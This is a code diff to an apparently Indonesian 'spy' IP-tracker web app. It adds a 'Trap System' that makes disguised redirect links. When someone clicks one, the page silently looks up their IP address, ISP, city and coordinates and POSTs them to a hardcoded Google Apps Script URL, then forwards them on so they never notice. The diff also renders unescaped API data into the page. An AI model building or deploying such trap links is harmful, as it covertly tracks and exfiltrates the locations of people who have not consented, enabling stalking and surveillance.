@@ -5,14 +5,22 @@ document.addEventListener('DOMContentLoaded', function () {
     const geoResult = document.getElementById('geo-result');
     const geoData = document.getElementById('geo-data');
     const logsBody = document.getElementById('logs-body');
+    const cloudApiInput = document.getElementById('cloud-api-url');
 
-    // 1. Fungsi Utility untuk Loading
+    // Load saved Cloud API URL (Default to user's provided URL)
+    const DEFAULT_CLOUD_URL = 'https://script.google.com/macros/s/AKfycbzqJb0FteRq7SUfHq3KIMYIoGYDfKdm-i12v0O6bHfYDqHy2fjdKCRB0TS_G5GzFBoktg/exec';
+    if (!localStorage.getItem('spy_cloud_url')) {
+        localStorage.setItem('spy_cloud_url', DEFAULT_CLOUD_URL);
+    }
+    cloudApiInput.value = localStorage.getItem('spy_cloud_url');
+
+    // 1. Utility: Loading
     function showLoading(show) {
         if (show) loading.classList.remove('d-none');
         else loading.classList.add('d-none');
     }
 
-    // 2. Deteksi IP Sendiri saat Load
+    // 2. Detect My IP
     async function detectMyIp() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -20,227 +28,169 @@ document.addEventListener('DOMContentLoaded', function () {
             myIpBadge.innerHTML = `<i class="fas fa-shield-alt me-2 text-primary"></i>${data.ip}`;
             return data.ip;
         } catch (err) {
-            myIpBadge.innerHTML = `<i class="fas fa-exclamation-triangle me-2 text-warning"></i>Offline / Blocked`;
+            myIpBadge.innerHTML = `<i class="fas fa-exclamation-triangle me-2 text-warning"></i>Detection Failed`;
             return null;
         }
     }
     detectMyIp();
 
-    // 3. Render HTML Hasil Pelacakan
-    function renderIntelHTML(data) {
-        const ip = data.ip || data.query || data.organization || 'Unknown';
-        const city = data.city || 'Unknown';
-        const country = data.country_name || data.country || 'Unknown';
-        const isp = data.org || data.isp || data.asn_org || 'Unknown';
-        const lat = data.latitude || data.lat || 0;
-        const lon = data.longitude || data.lon || 0;
-        const timezone = data.timezone || '-';
-
-        return `
-            <div class="result-card border-primary border-opacity-25 animate__animated animate__fadeInUp">
-                <h5 class="fw-bold text-primary mb-4 d-flex align-items-center">
-                    <i class="fas fa-user-secret me-2"></i>Hasil Intelijen IP: ${ip}
-                </h5>
-                <div class="row g-3">
-                    <div class="col-sm-6">
-                        <div class="data-label">LOKASI GEOGRAFIS</div>
-                        <div class="fs-5 text-white fw-semibold"><i class="fas fa-map-marked-alt me-2 text-muted"></i>${city}, ${country}</div>
-                    </div>
-                    <div class="col-sm-6">
-                        <div class="data-label">KOORDINAT PRESISI</div>
-                        <div class="fs-5 text-white fw-semibold"><i class="fas fa-compass me-2 text-muted"></i>${lat}, ${lon}</div>
-                    </div>
-                    <div class="col-sm-6">
-                        <div class="data-label">PENYEDIA LAYANAN (ISP)</div>
-                        <div class="text-white opacity-75"><i class="fas fa-building me-2 text-muted"></i>${isp}</div>
-                    </div>
-                    <div class="col-sm-6">
-                        <div class="data-label">ZONA WAKTU</div>
-                        <div class="text-white opacity-75"><i class="fas fa-clock me-2 text-muted"></i>${timezone}</div>
-                    </div>
-                </div>
-                <div class="mt-4">
-                    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link w-100 text-center py-2">
-                        <i class="fas fa-external-link-alt me-2"></i>BUKA DI GOOGLE MAPS
-                    </a>
-                </div>
-            </div>`;
-    }
-
-    // 4. Logika Penyimpanan Log Lokal (localStorage)
-    function saveLog(data, type = 'Manual') {
-        const logs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
-        const newEntry = {
-            id: Date.now(),
-            timestamp: new Date().toLocaleString('id-ID'),
+    // 3. Save to Cloud/Local
+    async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
+        const cloudUrl = localStorage.getItem('spy_cloud_url');
+        const logEntry = {
             ip: data.ip || data.query || 'Unknown',
-            isp: data.org || data.isp || data.asn_org || 'Unknown',
+            isp: data.org || data.isp || 'Unknown',
             location: `${data.city || 'Unknown'}, ${data.country_name || data.country || 'Unknown'}`,
             coords: `${data.latitude || data.lat || 0}, ${data.longitude || data.lon || 0}`,
+            target: targetUrl,
             type: type
         };
-        logs.unshift(newEntry);
-        localStorage.setItem('spy_logs', JSON.stringify(logs.slice(0, 30)));
+
+        // Simpan ke LocalStorage (Selalu)
+        const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
+        localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
+        localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));
+
+        // Simpan ke Cloud (Jika dikonfigurasi)
+        if (cloudUrl && cloudUrl.startsWith('http')) {
+            try {
+                await fetch(cloudUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // Google Script requires this for simple POST
+                    body: JSON.stringify(logEntry)
+                });
+            } catch (e) { console.error("Cloud Save Failed"); }
+        }
     }
 
-    // 5. Fungsi Utama Pelacakan (AJAX)
+    // 4. Fetch Logs (Cloud or Local)
+    async function loadLogs() {
+        const cloudUrl = localStorage.getItem('spy_cloud_url');
+        logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Syncing data...</td></tr>';
+
+        if (cloudUrl && cloudUrl.startsWith('http')) {
+            try {
+                const res = await fetch(cloudUrl);
+                const data = await res.json();
+                renderLogs(data);
+                return;
+            } catch (e) { console.warn("Cloud Fetch Failed, falling back to local"); }
+        }
+        
+        renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
+    }
+
+    function renderLogs(logs) {
+        if (!logs || logs.length === 0) {
+            logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas intelijen.</td></tr>';
+            return;
+        }
+        logsBody.innerHTML = logs.map(log => `
+            <tr>
+                <td><div class="text-primary small fw-bold">${log.timestamp || 'Just Now'}</div></td>
+                <td><strong>${log.ip}</strong><br><span class="text-muted extra-small">${log.isp}</span></td>
+                <td><span class="small">${log.location}</span></td>
+                <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
+            </tr>
+        `).join('');
+    }
+
+    // 5. Track Action
     async function performTrack(targetIp) {
         showLoading(true);
         resultArea.innerHTML = '';
-        geoResult.classList.add('d-none');
-
-        let queryIp = targetIp;
-        if (!queryIp) {
-            queryIp = await detectMyIp();
-        }
-
-        if (!queryIp) {
-            showLoading(false);
-            alert('IP tidak terdeteksi. Silakan ketik IP secara manual.');
-            return;
-        }
-
+        const queryIp = targetIp || await detectMyIp();
+        
         try {
-            // API 1: ipapi.co (Utama)
-            let response = await fetch(`https://ipapi.co/${queryIp}/json/`);
-            let data = await response.json();
-            
-            if (data.error || data.reason === "RateLimit") {
-                throw new Error("Rate limit or Error");
-            }
-
+            const res = await fetch(`https://ipapi.co/${queryIp}/json/`);
+            const data = await res.json();
             showLoading(false);
-            resultArea.innerHTML = renderIntelHTML(data);
-            saveLog(data, targetIp ? 'Target Search' : 'Self Track');
-
-        } catch (err) {
-            // Fallback API 2: geojs.io (Lebih stabil & No Rate Limit)
-            try {
-                const response = await fetch(`https://get.geojs.io/v1/ip/geo/${queryIp}.json`);
-                const data = await response.json();
-                
-                showLoading(false);
-                resultArea.innerHTML = renderIntelHTML(data);
-                saveLog(data, targetIp ? 'Target Search' : 'Self Track');
-            } catch (err2) {
-                showLoading(false);
-                resultArea.innerHTML = `<div class="alert alert-danger border-danger border-opacity-25">Gagal menghubungi semua server intelijen. Periksa koneksi internet Anda atau matikan ad-blocker.</div>`;
+            
+            if (data.error) {
+                resultArea.innerHTML = `<div class="alert alert-danger">IP tidak valid.</div>`;
+                return;
             }
-        }
+
+            resultArea.innerHTML = `
+                <div class="result-card border-primary border-opacity-25 animate__animated animate__fadeInUp">
+                    <h5 class="fw-bold text-primary mb-4 d-flex align-items-center"><i class="fas fa-user-secret me-2"></i>Intel: ${data.ip}</h5>
+                    <div class="row g-3">
+                        <div class="col-sm-6"><div class="data-label">LOKASI</div><div class="fs-6 text-white">${data.city}, ${data.country_name}</div></div>
+                        <div class="col-sm-6"><div class="data-label">KOORDINAT</div><div class="fs-6 text-white">${data.latitude}, ${data.longitude}</div></div>
+                    </div>
+                    <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank" class="map-link w-100 text-center mt-3 py-2">BUKA PETA</a>
+                </div>`;
+            
+            saveLog(data, targetIp ? 'Search' : 'Self');
+        } catch (e) { showLoading(false); alert("Server error"); }
     }
 
-    // 6. Event Listeners Tab 1 (Tracker)
-    document.getElementById('btn-track-ip').addEventListener('click', () => {
-        const ip = document.getElementById('ip-to-track').value.trim();
-        performTrack(ip);
-    });
-
+    // 6. UI Events
+    document.getElementById('btn-track-ip').addEventListener('click', () => performTrack(document.getElementById('ip-to-track').value));
     document.getElementById('btn-track-me').addEventListener('click', () => performTrack(''));
-
-    document.getElementById('btn-geolocation').addEventListener('click', () => {
-        if (!navigator.geolocation) return alert('GPS tidak didukung browser ini.');
-        showLoading(true);
-        navigator.geolocation.getCurrentPosition(pos => {
-            showLoading(false);
-            geoResult.classList.remove('d-none');
-            const { latitude, longitude } = pos.coords;
-            geoData.innerHTML = `
-                <div class="row g-4">
-                    <div class="col-12">
-                        <div class="data-item d-flex align-items-center mb-3">
-                            <div class="data-icon bg-info text-info bg-opacity-10"><i class="fas fa-satellite"></i></div>
-                            <div>
-                                <div class="data-label">KOORDINAT GPS REAL-TIME</div>
-                                <div class="fs-4 text-white fw-bold">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</div>
-                            </div>
-                        </div>
-                        <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="map-link bg-info w-100 text-center py-2">
-                            <i class="fas fa-map-marked-alt me-2"></i>LIHAT POSISI GPS
-                        </a>
-                    </div>
-                </div>`;
-            geoResult.scrollIntoView({ behavior: 'smooth' });
-        }, err => {
-            showLoading(false);
-            alert(`Akses GPS ditolak: ${err.message}`);
-        });
+    document.getElementById('logs-tab').addEventListener('click', loadLogs);
+    document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
+    
+    document.getElementById('btn-save-api').addEventListener('click', function() {
+        localStorage.setItem('spy_cloud_url', cloudApiInput.value.trim());
+        const btn = this;
+        btn.innerHTML = '<i class="fas fa-check"></i>';
+        setTimeout(() => btn.innerHTML = '<i class="fas fa-save"></i>', 2000);
     });
 
-    // 7. Event Listeners Tab 2 (Link Generator)
+    document.getElementById('btn-clear-logs').addEventListener('click', () => {
+        if(confirm('Hapus log lokal?')) { localStorage.removeItem('spy_logs'); loadLogs(); }
+    });
+
+    // 7. Link Generator (Trap System)
     const btnGenerate = document.getElementById('btn-generate-link');
     const spyUrlResult = document.getElementById('spy-url-result');
     const generatedResult = document.getElementById('generated-result');
 
     btnGenerate.addEventListener('click', () => {
         const targetUrl = document.getElementById('target-url').value.trim();
-        if (!targetUrl || !targetUrl.startsWith('http')) {
-            return alert('Masukkan URL lengkap (dengan http:// atau https://)');
-        }
+        if (!targetUrl.startsWith('http')) return alert('Masukkan URL lengkap!');
         
         const currentUrl = window.location.href.split('?')[0];
-        const spyId = Math.random().toString(36).substring(2, 10);
+        const spyId = Math.random().toString(36).substring(7);
         spyUrlResult.value = `${currentUrl}?id=${spyId}&redir=${encodeURIComponent(targetUrl)}`;
         generatedResult.classList.remove('d-none');
     });
 
     document.getElementById('btn-copy-link').addEventListener('click', async function() {
-        const btn = this;
-        const originalHTML = btn.innerHTML;
-        try {
-            await navigator.clipboard.writeText(spyUrlResult.value);
-            btn.innerHTML = '<i class="fas fa-check"></i>';
-            btn.classList.replace('btn-outline-success', 'btn-success');
-            setTimeout(() => {
-                btn.innerHTML = originalHTML;
-                btn.classList.replace('btn-success', 'btn-outline-success');
-            }, 2000);
-        } catch (err) {
-            // Fallback for older browsers
-            spyUrlResult.select();
-            document.execCommand('copy');
-        }
+        await navigator.clipboard.writeText(spyUrlResult.value);
+        this.innerHTML = '<i class="fas fa-check"></i>';
+        setTimeout(() => this.innerHTML = '<i class="fas fa-copy"></i>', 2000);
     });
 
-    // 8. Event Listeners Tab 3 (Logs)
-    function loadLogs() {
-        const logs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
-        if (logs.length === 0) {
-            logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-5 text-muted opacity-50"><i class="fas fa-history d-block fs-1 mb-3"></i>Belum ada aktivitas intelijen.</td></tr>';
-            return;
-        }
-
-        logsBody.innerHTML = logs.map(log => `
-            <tr class="animate__animated animate__fadeIn">
-                <td><div class="text-primary small fw-bold">${log.timestamp}</div><div class="extra-small opacity-50">${log.type}</div></td>
-                <td><strong>${log.ip}</strong><br><span class="text-muted extra-small text-truncate d-inline-block" style="max-width: 150px;">${log.isp}</span></td>
-                <td><span class="small text-white">${log.location}</span></td>
-                <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
-            </tr>
-        `).join('');
-    }
-
-    document.getElementById('logs-tab').addEventListener('click', loadLogs);
-    document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
-    document.getElementById('btn-clear-logs').addEventListener('click', () => {
-        if (confirm('Hapus semua data intelijen lokal?')) {
-            localStorage.removeItem('spy_logs');
-            loadLogs();
-        }
-    });
-
-    // 9. Handle Logika Redirection (Jika link diklik target)
+    // 8. Handle Redirect (The Trap)
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('id') && urlParams.has('redir')) {
         const redirTarget = urlParams.get('redir');
-        // Lakukan pelacakan diam-diam sebelum redirect menggunakan Fallback API
-        fetch('https://get.geojs.io/v1/ip/geo.json')
+        const cloudUrl = localStorage.getItem('spy_cloud_url');
+        
+        // Silent Tracking
+        fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                saveLog(data, 'Trap Link Click');
-                window.location.href = redirTarget;
+                // Prepare log data
+                const logEntry = {
+                    ip: data.ip,
+                    isp: data.org,
+                    location: `${data.city}, ${data.country_name}`,
+                    coords: `${data.latitude}, ${data.longitude}`,
+                    target: redirTarget,
+                    type: 'TRAP'
+                };
+
+                // Send to Cloud if configured
+                if (cloudUrl) {
+                    fetch(cloudUrl, { method: 'POST', mode: 'no-cors', body: JSON.stringify(logEntry) })
+                        .finally(() => window.location.href = redirTarget);
+                } else {
+                    window.location.href = redirTarget;
+                }
             })
-            .catch(() => {
-                window.location.href = redirTarget;
-            });
+            .catch(() => window.location.href = redirTarget);
     }
 });
